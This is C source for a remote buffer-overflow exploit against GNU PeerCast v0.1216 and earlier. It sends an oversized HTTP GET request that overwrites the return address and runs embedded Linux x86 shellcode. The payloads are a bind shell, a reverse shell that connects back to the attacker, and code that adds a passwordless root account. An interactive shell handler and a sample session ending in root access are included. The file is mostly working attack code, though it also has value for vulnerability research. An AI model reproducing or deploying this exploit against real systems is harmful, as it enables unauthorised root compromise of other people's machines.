/* GNU PeerCast <= v0.1216 Remote Exploit
 * ======================================
 * PeerCast is a simple, free way to listen to radio and watch video on the internet. A 
 * remotely exploitable buffer overflow has been identified by INFIGO-2006-03-01 which 
 * can be potentially exploited to execute arbitrary code due to insufficient bounds
 * checking on a memory copy operation occuring on the stack. All versions upto and
 * prior to v0.1216 are believed to be vulnerable. The linux return address does a 
 * "jmp esp" as esp references the start of our shellcode, thus the exploit will 
 * work on VA randomized hosts and across multiple targets. This exploit is updated
 * due to some bugs identified.
 * 
 * Example.
 * [ GNU PeerCast <= v0.1216 remote exploit
 * [ Using shellcode 'Linux x86 connect() shellcode (4444/tcp default)' (70 bytes)
 * [ Using target '(GNU peercast v0.1212) 2.4.28-gentoo-r8 (Gentoo Linux 3.3.5-r1)'
 * [ Connected to 192.168.1.25 (7144/tcp)
 * [ Sent 880 bytes to target
 * [ Connection from foreign host found.
 * Linux linux 2.4.28-gentoo-r8 #1 Sat Mar 26 17:08:02 GMT 2005 i686 Intel(R) Pentium(R) M processor 1700MHz GenuineIntel GNU/Linux
 * 19:39:07 up 19 min,  1 user,  load average: 0.00, 0.00, 0.00
 * root     vc/1         May 24 19:20
 * uid=0(root) gid=0(root) groups=0(root)
 *  
 *  -prdelka
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>


struct target {
	char* name; 
	int retaddr;	
};

struct shellcode {
	char* name;	
	short port;
	int host;
	char* shellcode;	
};

const int targetno = 2;

struct target targets[] = { 
	{"(GNU peercast v0.1212) 2.4.28-gentoo-r8 (Gentoo Linux 3.3.5-r1)",0x080918AF},
	{"(GNU peercast v0.1212) 2.6.14-gentoo-r2 (Gentoo 3.3.5.20050130-r1)",0x080918AF}
};

const int shellno = 3;

struct shellcode shellcodes[] = {
	{"Linux x86 bind() shellcode (4444/tcp default)",20,-1,
	"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
	"\x43\x52\x66\x68\x11\x5c\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
	"\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
	"\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
	"\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
	"\x89\xe1\xcd\x80"},
	{"Linux x86 connect() shellcode (4444/tcp default)",32,26,
	"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
	"\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\x01\x02\x03\x04\x66\x68"
	"\x11\x5c\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
	"\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
	"\x89\xe1\xb0\x0b\xcd\x80"},
	{"Linux x86 add user 'syscfg' with {null} password and UID 0",-1,-1,
	"\x31\xC0\x50\x68\x73\x73\x77\x64\x68\x2F\x2F\x70\x61\x68\x2F\x65"
	"\x74\x63\x89\xE6\x31\xD2\x31\xC9\xB1\x01\x89\xF3\x31\xC0\xB0\x05"
	"\xCD\x80\x50\x89\xE6\x31\xC0\xB0\x13\x8B\x1E\x31\xC9\x31\xD2\xB2"
	"\x02\xCD\x80\x31\xC0\xB0\x04\x8B\x1E\x31\xC9\x51\x68\x61\x73\x68"
	"\x0A\x68\x69\x6E\x2F\x62\x68\x74\x3A\x2F\x62\x68\x2F\x72\x6F\x6F"
	"\x68\x63\x66\x67\x3A\x68\x66\x6F\x72\x20\x68\x73\x65\x72\x20\x68"
	"\x65\x6D\x20\x75\x68\x73\x79\x73\x74\x68\x30\x3A\x30\x3A\x68\x66"
	"\x67\x3A\x3A\x68\x73\x79\x73\x63\x89\xE1\x31\xD2\xB2\x30\xCD\x80"
	"\x31\xC0\xB0\x06\x8B\x1E\xCD\x80"}
};

void dummyhandler() {
}

void shell(int sd) {
	int rcv;
	char sockbuf[2048];
	fd_set readfds;
	sprintf(sockbuf, "uname -a;uptime;who;id\n");
	write(sd, sockbuf, strlen(sockbuf));
	while (1) {
		FD_ZERO(&readfds);
		FD_SET(0, &readfds);
		FD_SET(sd, &readfds);
		select(255, &readfds, NULL, NULL, NULL);
		if (FD_ISSET(sd, &readfds)) {
			memset(sockbuf, 0, 2048);
			rcv = read(sd, sockbuf, 2048);
			if (rcv <= 0) {
              			printf("[ Connection closed by foreign host.\n");
              			exit(-1);
            		}
			printf("%s", sockbuf);
		}
      		if(FD_ISSET(0, &readfds)) {
			memset(sockbuf, 0, 2048);
			read(0, sockbuf, 2048);
			write(sd, sockbuf, 2048);
        	}
    	}
}

void shellbind_prelude(struct sockaddr_in servAddr, short shellport2){
        int sd, rc;
        sleep(1);
        sd = socket(AF_INET, SOCK_STREAM, 0);
        servAddr.sin_port = htons(shellport2);
        rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
        if(rc<0){
                printf("[ Cannot connect to foreign host.\n");
                exit(1);
        }
        shell(sd);
}

void shellconnect_prelude(struct sockaddr_in servAddr,struct sockaddr_in locAddr, short shellport2){
	int sd;
	sd = socket(AF_INET,SOCK_STREAM,0);
	memset(&servAddr,0,sizeof servAddr);
	servAddr.sin_family = AF_INET;
        servAddr.sin_port = htons(shellport2);
        servAddr.sin_addr.s_addr = INADDR_ANY;
        if((bind(sd,(struct sockaddr *)&servAddr,sizeof(struct sockaddr))) == -1){
        	printf("[ Cannot bind listener service\n");
		exit(-1);
        }
        alarm(30);
        listen(sd,4);
        int sin_size = sizeof(struct sockaddr_in);
        sd = accept(sd,(struct sockaddr *)&locAddr,&sin_size);
        alarm(0);
        if(sd == -1){
        	printf("[ Connection from foreign host not found.\n");
                exit(1);
        }
        printf("[ Connection from foreign host found.\n");
        shell(sd);
}

int main (int argc, char *argv[]) {
	int sd, rc, i, c, ret, payg, paya, payb, eip, ishell = 0, port = 7144, ihost = 0, itarg = 0;
	int count, offset, ioffset, lhost, index = 0;
	short shellport, shellport2;
	char *host, *buffer, *buffer2, *payload;	
	struct sockaddr_in locAddr, servAddr;
	struct hostent *h;
        static struct option options[] = {
        	{"server", 1, 0, 's'},
	        {"port", 1, 0, 'p'},
        	{"target", 1, 0, 't'},
		{"shellcode", 1, 0, 'c'},
		{"shellport", 1, 0, 'x'},
		{"shellhost", 1, 0, 'i'},
		{"help", 0, 0,'h'}
        };
	printf("[ GNU PeerCast <= v0.1216 remote exploit\n");
	while(c != -1)
	{
	        c = getopt_long(argc,argv,"s:p:t:c:x:i:h",options,&index);	
        	switch(c) {
               		case -1:
	                        break;
        	        case 's':
				if(ihost==0){
				h = gethostbyname(optarg);				
				if(h==NULL){
					printf("[ Error unknown host '%s'\n",optarg);
					exit(1);
				}
				host = malloc(strlen(optarg) + 1);
				sprintf(host,"%s",optarg);
				ihost = 1;
				}
               			break;
	                case 'p':
				port = atoi(optarg);
                	        break;
			case 'c':
				if(ishell==0)
				{
				payg = atoi(optarg);
				switch(payg){
				case 0:		
					printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));		
					payload = malloc(strlen(shellcodes[payg].shellcode)+1);
					memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
					memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
					shellport2 = 4444;
					ishell = 1;
					break;
				case 1:
                                       printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
				       payload = malloc(strlen(shellcodes[payg].shellcode)+1);
	                               memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
	                               memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
				       shellport2 = 4444;
	                               ishell = 1;
	                               break;
                                case 2:
                                       printf("[ Using shellcode '%s' (%d bytes)\n",shellcodes[payg].name,strlen(shellcodes[payg].shellcode));
                                       payload = malloc(strlen(shellcodes[payg].shellcode)+1);
                                       memset(payload,0,strlen(shellcodes[payg].shellcode)+1);
        	                       memcpy((void*)payload,(void*)shellcodes[payg].shellcode,strlen(shellcodes[payg].shellcode));
	                               ishell = 1;
				       break;
				default:
					printf("[ Invalid shellcode selection %d\n",payg);
					exit(0);
					break;
				}
				}
				break;
			case 'x':
				if(ishell==1)
				{
					if(shellcodes[payg].port > -1)
					{
						paya = strlen(payload);
						shellport = atoi(optarg);
						shellport2 = shellport;
						shellport =(shellport&0xff)<<8 | shellport>>8;
						memcpy((void*)&payload[shellcodes[payg].port],&shellport,sizeof(shellport));
						if(paya > strlen(payload))
						{
							printf("[ Error shellcode port introduces null bytes\n");
							exit(1);
						}
					}
					else{
						printf("[ (%s) port selection is ignored for current shellcode\n",optarg);
					}
				}
				else{
					printf("[ No shellcode selected yet, ignoring (%s) port selection\n",optarg);
					break;
				}
				break;
			case 'i':
				if(ishell==1){
					if(shellcodes[payg].host > -1){
						paya = strlen(payload);
						lhost = inet_addr(optarg);
						memcpy((void*)&payload[shellcodes[payg].host],&lhost,sizeof(lhost));
						if(paya > strlen(payload)){
							printf("[ Error shellhost introduces null bytes\n");
							exit(1);
						}					
					}
					else{
						printf("[ (%s) shellhost selection is ignored for current shellcode\n",optarg);						
					}
				}
				else{
					printf("[ No shellcode selected yet, ignoring (%s) shellhost selection\n",optarg);					
				}		
				break;
	                case 't':
				if(itarg==0){
				ret = atoi(optarg);			
				switch(ret){
					case 0:	
						printf("[ Using target '%s'\n",targets[ret].name);
						eip = targets[ret].retaddr;
						break;						
                                        case 1:
                                                printf("[ Using target '%s'\n",targets[ret].name);
                                                eip = targets[ret].retaddr;
                                                break;
					default:	
						eip = strtoul(optarg,NULL,16);
						printf("[ Using return address '0x%x'\n",eip);
						break;
				}
				itarg = 1;
				}
        	                break;
			case 'h':			
				printf("[ Usage instructions.\n[\n");				
				printf("[ %s <required> (optional)\n[\n[   --server|-s <ip/hostname>\n",argv[0]);
				printf("[   --port|-p (port)[default 7144]\n[   --shellcode|-c <shell#>\n");
				printf("[   --shellport|-x (port)\n");
				printf("[   --shellhost|-i (ip)\n");
				printf("[   --target|-t <target#/0xretaddr>\n[\n");
				printf("[ Target#'s\n");
				for(count = 0;count <= targetno - 1;count++){
					printf("[ %d %s 0x%x\n",count,targets[count],targets[count]);
				}
				printf("[\n[ Shellcode#'s\n");
				for(count = 0;count <= shellno - 1;count++){
					printf("[ %d \"%s\" (length %d bytes)\n",count,shellcodes[count].name,strlen(shellcodes[count].shellcode));
				}
				exit(0);
				break;
			default:
                		break;
	        }
	}
	if(itarg != 1 || ihost  != 1 || ishell != 1){
		printf("[ Error insufficient arguements, try running '%s --help'\n",argv[0]);
		exit(1);
	}
	signal(SIGPIPE,dummyhandler);
        servAddr.sin_family = h->h_addrtype;
	memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
	servAddr.sin_port = htons(port);
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd<0) {
		printf("[ Cannot open socket\n");	
		exit(1);
	}
	rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
	if(rc<0) {
		printf("[ Cannot connect\n");
		exit(1);
	}
	printf("[ Connected to %s (%d/tcp)\n",host,port);	
	buffer = malloc(4096 + strlen(payload) + sizeof(eip));
	memset(buffer,0,4096 + strlen(payload) + sizeof(eip));
	strcpy(buffer,"GET /stream/?");
	for(count = 0;count <= 779;count++){
		strcat(buffer,"A");
	}
        buffer2 = (char*)((int)buffer + (int)strlen(buffer));
        memcpy((void*)buffer2,(void*)&eip,sizeof(eip));
       	buffer2 = (char*)((int)buffer2 + sizeof(eip));
        memcpy((void*)buffer2,(void*)payload,strlen(payload));
	strcat(buffer2," HTTP/1.0\r\n\r\n");
	rc = send(sd,buffer,strlen(buffer),0);
	printf("[ Sent %d bytes to target\n",rc);
	close(sd);
	switch(payg){
		case 0:
			printf("[ Connecting to shell on %s (%d/tcp)\n",host,shellport2);
			shellbind_prelude(servAddr,shellport2);		        
			break;
		case 1:		        
			shellconnect_prelude(servAddr,locAddr,shellport2);
			break;
                case 3:
                        printf("[ Connecting to shell on %s (%d/tcp)\n",host,shellport2);
                        shellbind_prelude(servAddr,shellport2);
                        break;
                case 4:
                        shellconnect_prelude(servAddr,locAddr,shellport2);
                        break;
		default:
			printf("[ Exploit success? Your payload does not require management.\n");
			exit(0);
			break;
	}
	exit(-1);
}
